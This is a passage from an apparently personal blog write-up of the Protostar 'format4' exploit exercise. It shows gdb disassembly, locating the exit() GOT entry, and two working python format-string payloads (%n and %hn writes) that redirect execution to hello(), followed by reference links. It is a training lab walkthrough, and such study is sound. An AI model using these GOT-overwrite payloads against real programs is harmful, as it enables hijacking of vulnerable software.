<span class="mh">0x080484c6</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x1</span>
<span class="mh">0x080484cd</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x80483bc</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
<span class="mh">0x080484db</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="nl">ds</span><span class="p">:</span><span class="mh">0x8049730</span>
<span class="mh">0x080484e0</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x080484e4</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x200</span>
<span class="mh">0x080484ec</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
<span class="mh">0x080484f2</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x080484f5</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x804839c</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080484fa</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
<span class="mh">0x08048500</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x08048503</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483cc</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048508</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x1</span>
<span class="mh">0x0804850f</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">61</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483ec</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>


<p>So we have to manipulate the final call to exit().
Let&rsquo;s examine the respective instructions.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
<span class="mh">0x804850f</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">61</span><span class="o">&gt;:</span>    <span class="n">call</span>   <span class="mh">0x80483ec</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">3</span><span class="n">i</span> <span class="mh">0x80483ec</span>
<span class="mh">0x80483ec</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span>   <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x8049724</span>
<span class="mh">0x80483f2</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="mh">0x30</span>
<span class="mh">0x80483f7</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>        <span class="n">jmp</span>    <span class="mh">0x804837c</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x8049724</span>
<span class="mh">0x8049724</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;:</span>   <span class="mh">0x080483f2</span>
</code></pre></div>
</p>

<p>We have to write the target address of hello() to 0x08049724.
First, we identify the offset for our address.
This time we use gdb to do just that.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbffff410</span><span class="o">:</span>     <span class="mh">0xbffff420</span>      <span class="mh">0x00000200</span>      <span class="mh">0xb7fd8420</span>      <span class="mh">0xbffff464</span>
<span class="mh">0xbffff420</span><span class="o">:</span>     <span class="mh">0x61616161</span>      <span class="mh">0x0000000a</span>      <span class="mh">0xb7fff524</span>      <span class="mh">0x00000000</span>
<span class="mh">0xbffff430</span><span class="o">:</span>     <span class="mh">0xb7fff524</span>      <span class="mh">0xbffff4c0</span>      <span class="mh">0xb7fe35c9</span>      <span class="mh">0x00000007</span>
</code></pre></div>


<p>We already had the address of the target buffer.
Also, the desired value for the target buffer is clear.
With an offset of 4 we now can continue.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/opt/protostar/bin$</span> python -c <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;+ &quot;\x25\x97\x04\x08&quot;+ &quot;\x26\x97\x04\x08&quot;+ &quot;\x27\x97\x04\x08&quot;+ &quot;%164x%4$n&quot;+ &quot;%208x%5$n&quot;+ &quot;%128x%6$n&quot;+ &quot;%4c%7$n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format4
<span class="go">...</span>
<span class="go">code execution redirected! you win</span>
</code></pre></div>


<p>With the reuse of the existing address we can optimze the size.
To do this, we have to utilize the short write <strong>hf</strong> for printf.
This reduces the overall length of the command to complete this exercise.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/opt/protostar/bin$</span> python -c <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;+ &quot;%33968c%4$hn&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format4
<span class="go">...</span>
<span class="go">code execution redirected! you win</span>
</code></pre></div>


<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-format/">TheSprawl - protostar - format string levels</a></li>
<li><a href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/">Louis Li</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
</ul>

<h2 id="return-oriented-programming">Return-oriented Programming</h2>

<ul>
<li><a href="http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">Exploiting Format String Vulnerabilities</a></li>
</ul>

<h2 id="other">Other</h2>

<ul>
<li><a href="http://unix.stackexchange.com/questions/15531/how-come-no-core-dump-is-create-when-an-application-has-suid-set">Core dump suid binaries</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://localhost:1313/blog/2014/09/Exploit-Exercises---Protostar---Network-levels/"> Exploit Exercises - Protostar - Network levels</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://localhost:1313/blog/2014/08/Exploit-Exercises---Protostar---Stack-levels/"> Exploit Exercises - Protostar - Stack levels</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; 2017. All rights reserved. </p>

  
  

  <script type="text/javascript" src="http://localhost:1313//js/jquery-2.1.4.js"></script>

  <script src="http://localhost:1313//js/bootstrap.min.js"></script>
  <script src="http://localhost:1313//js/bootstrap.js"></script>
  <script type="text/javascript" src="http://localhost:1313//js/hc.js"></script>

  
  <script type="text/javascript" src="http://localhost:1313//lightbox/js/lightbox.js"></script>
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', "UA-83225898-1", 'auto');
    ga('send', 'pageview');
  </script>
  

  

</footer>

	<script data-no-instant>document.write('<script src="/livereload.js?port=1313&mindelay=10"></' + 'script>')</script></body>
</html>
